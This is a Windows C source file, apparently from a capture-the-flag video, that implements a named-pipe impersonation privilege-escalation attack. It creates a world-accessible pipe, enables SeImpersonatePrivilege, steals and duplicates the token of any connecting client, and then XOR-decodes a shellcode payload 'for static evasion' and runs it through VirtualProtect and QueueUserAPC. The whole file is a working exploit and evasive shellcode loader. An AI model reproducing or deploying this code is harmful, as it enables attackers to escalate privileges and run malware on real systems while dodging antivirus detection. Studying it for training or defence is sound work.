/* ------------------------------------------------
 *
 * From IppSec HackBack YouTube video 
 *
 * https://youtu.be/B9nozi1PrhY
 *
 * ------------------------------------------------ */

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stdio.h>
#include "payload.h"
#include <aclapi.h>
#define ENCRYPTION_KEY "PLEASESUB"
#define ENCRYPTION_KEY_LEN 9

void static_evasion(void) {
  unsigned char *k = ENCRYPTION_KEY;
  for (int i = 0; i < sizeof(buf); i++) {
    buf[i] ^= k[i % ENCRYPTION_KEY_LEN];
  };
}

static void execute_payload(void) {
  DWORD p_old;
  static_evasion();
  VirtualProtect(buf, sizeof(buf), PAGE_EXECUTE_READ, (PDWORD)&p_old);
  QueueUserAPC((PAPCFUNC)buf, GetCurrentThread(), (ULONG_PTR)NULL);
  SleepEx(5000, TRUE);
  
};


/* Create a DACL that will allow everyone to have full control over our pipe. */
static VOID BuildDACL(PSECURITY_DESCRIPTOR pDescriptor)
{
    PSID pSid;
    EXPLICIT_ACCESS ea;
    PACL pAcl;

    SID_IDENTIFIER_AUTHORITY sia = SECURITY_WORLD_SID_AUTHORITY;

    AllocateAndInitializeSid(&sia, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0,
        &pSid);

    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea.grfAccessPermissions = FILE_ALL_ACCESS;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = (LPTSTR)pSid;

    if(SetEntriesInAcl(1, &ea, NULL, &pAcl) == ERROR_SUCCESS)
    {
        if(SetSecurityDescriptorDacl(pDescriptor, TRUE, pAcl, FALSE) == 0)
            printf("[*] Failed to set DACL (0x%x)\n", GetLastError());
    }
    else
        printf("[*] Failed to add ACE in DACL (0x%x)\n", GetLastError());
}


/* Create a SACL that will allow low integrity processes connect to our pipe. */
static VOID BuildSACL(PSECURITY_DESCRIPTOR pDescriptor)
{
    PSID pSid;
    PACL pAcl;

    SID_IDENTIFIER_AUTHORITY sia = SECURITY_MANDATORY_LABEL_AUTHORITY;
    DWORD dwACLSize = sizeof(ACL) + sizeof(SYSTEM_MANDATORY_LABEL_ACE) +
        GetSidLengthRequired(1);

    pAcl = (PACL)LocalAlloc(LPTR, dwACLSize);
    InitializeAcl(pAcl, dwACLSize, ACL_REVISION);

    AllocateAndInitializeSid(&sia, 1, SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0,
        0, 0, 0, &pSid);

    if(AddMandatoryAce(pAcl, ACL_REVISION, 0, SYSTEM_MANDATORY_LABEL_NO_WRITE_UP,
            pSid) == TRUE)
    {
        if(SetSecurityDescriptorSacl(pDescriptor, TRUE, pAcl, FALSE) == 0)
            printf("[*] Failed to set SACL (0x%x)\n", GetLastError());
    }
    else
        printf("[*] Failed to add ACE in SACL (0x%x)\n", GetLastError());
}

/* Initialize security attributes to be used by `CreateNamedPipe()' below. */
static VOID InitSecurityAttributes(PSECURITY_ATTRIBUTES pAttributes)
{
    PSECURITY_DESCRIPTOR pDescriptor;

    pDescriptor = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR,
        SECURITY_DESCRIPTOR_MIN_LENGTH);
    InitializeSecurityDescriptor(pDescriptor, SECURITY_DESCRIPTOR_REVISION);

    BuildDACL(pDescriptor);
    BuildSACL(pDescriptor);

    pAttributes->nLength = sizeof(SECURITY_ATTRIBUTES);
    pAttributes->lpSecurityDescriptor = pDescriptor;
    pAttributes->bInheritHandle = TRUE;
}


static void * create_namedpipe(char * p_name) {
  void * p_pipe;
  BOOL b_ret;
  SECURITY_ATTRIBUTES sa;
  InitSecurityAttributes(&sa);

  // EnableWindowsPrivilege("SE_IMPERSONATE_NAME");
  
  p_pipe = CreateNamedPipeA(p_name,
			    PIPE_ACCESS_DUPLEX,
			    PIPE_TYPE_BYTE | PIPE_WAIT | PIPE_REJECT_REMOTE_CLIENTS,
			    2,
			    0,0,0,
			    &sa);

  if (p_pipe != INVALID_HANDLE_VALUE) {
    b_ret =  ConnectNamedPipe(p_pipe, NULL);
    if (b_ret != FALSE) {
      return p_pipe;
    };
    printf("[ ] ConnectNamedPipe() 0x%x\n", GetLastError());
    CloseHandle((HANDLE) p_pipe);
  } else {
    printf("[ ] CreateNamedPipeA() 0x%x\n", GetLastError());
  };
  return NULL;
};

static int enable_privilege(void* ptoken, char* sepriv) {
	LUID g_privluid;
	TOKEN_PRIVILEGES g_tokenpriv;
	BOOL b_ret;

	// "Zero" the memory on the stack for safety!
	RtlSecureZeroMemory(&g_tokenpriv, sizeof(TOKEN_PRIVILEGES));

	// Lookup the privilege's luid by its ansi name.
	b_ret = LookupPrivilegeValue(NULL, sepriv, &g_privluid);
	if ( b_ret != TRUE ) {
		printf("[ ] LookupPrivilegeValue 0x%x\n", GetLastError());
		return -1;
	};

	// Using the TOKEN_PRIVILEGES structure, we set the privilege LUID & its attribute
	g_tokenpriv.PrivilegeCount           = 1;
	g_tokenpriv.Privileges[0].Luid       = g_privluid;
	g_tokenpriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	b_ret = AdjustTokenPrivileges(ptoken, // The token to modify!
			FALSE,                // Disable all privileges or dont? False lol.
			&g_tokenpriv,	      // Pointer to a token privileges structure.
			sizeof(TOKEN_PRIVILEGES), // size of structure
			(PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
	if ( b_ret != TRUE ) {
		printf("[ ] AdjustTokenPrivileges 0x%x\n", GetLastError());
		return -1;
	};

	return 0;
};

static void * smbpipe_impersonate(void* h_pipe) {
	BOOL b_ret;
	void* p_itoken;
	void* p_dtoken;
	char* bytes[5];
	DWORD dwread;
	b_ret = ReadFile(h_pipe, (char *)bytes, 1, &dwread, NULL);
       if ( b_ret != TRUE ) {
		printf("[ ] ReadFile() 0x%x\n", GetLastError());
		return NULL;
	};
	b_ret = ImpersonateNamedPipeClient(h_pipe);
	if ( b_ret != TRUE ) {
		printf("[ ] ImpersonateNamedPipeClient() 0x%x\n", GetLastError());
		return NULL;
	};
	b_ret = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &p_itoken);
	if ( b_ret != TRUE ) {
		printf("[ ] OpenThreadToken() 0x%x\n", GetLastError());
		return NULL;
	};
	
	// TODO: check privilege for SeImpersonate
	b_ret = DuplicateToken(p_itoken, SecurityImpersonation, &p_dtoken);
	if ( b_ret != TRUE ) {
		printf("[ ] DuplicateToken() 0x%x\n", GetLastError());
		CloseHandle((HANDLE)p_itoken);
		return NULL;
	};
	// RevertToSelf(); // Revert impersonation!

	return p_dtoken;
};



int main(int argc, char *argv[]) {
  void * p_pipe;
  void * p_itoken;
  void * p_ptoken;

  OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &p_ptoken);
  enable_privilege(p_ptoken, "SeImpersonatePrivilege");
  
  p_pipe = create_namedpipe(argv[1]);
  if (p_pipe != NULL) {
    printf("[*] Connection\n");
    p_itoken = smbpipe_impersonate(p_pipe);
    
    DisconnectNamedPipe((HANDLE) p_pipe);
    CloseHandle(p_pipe);

    if (p_itoken != NULL) {
      printf("[*] Impersonating User\n");
      ImpersonateLoggedOnUser(p_itoken);
      execute_payload();
    };
  };
  // execute_payload();
}
